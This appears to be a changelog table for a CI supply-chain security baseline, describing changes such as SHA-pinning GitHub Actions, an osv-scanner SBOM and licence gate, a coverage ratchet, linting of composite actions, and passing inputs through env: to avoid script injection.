| **SHA-pinned third-party actions** (#47) | Every action was on a mutable tag. Whoever controls `actions/checkout@v7` can repoint it, and that code runs in every consumer's CI with their token. CI guard added, since reviewers do not reliably notice `@v7`. Annotated tags dereference to a tag object, not a commit — resolve `.object.sha` and then dereference. |
| **SBOM + licence gate** | Both from osv-scanner, already installed and pinned. See §4 for the three ways this silently produces a useless artifact. |
| **Coverage ratchet** | The gate had no notion of tests at all. Ratchet not threshold; CONCEPT §12 for why the floor is a committed file and not a cache. |
| **Composite actions are now linted** | actionlint reads workflows only. The composite actions — the part consumers execute — had no shell linting, which is the same gap `actions/report-issue` shipped broken through. |
| **Inputs pass through `env:`, not `${{ }}`** | `${{ }}` is substituted into the script text before bash parses it. Low exposure here (inputs come from a caller's workflow, not a PR title), but a baseline that gates other repos' supply chains should not model the pattern it exists to catch. |
| **`GITHUB_ACTION_PATH` references are checked** | Moving a script breaks every consumer at runtime, in a workflow nothing here executes, with a "no such file" pointing at a path on someone else's runner. |
| **The report workflow outputs its issue number** | So a caller can assert the report *landed*. A broken report path and a clean repo were previously indistinguishable — exactly how #46 shipped. |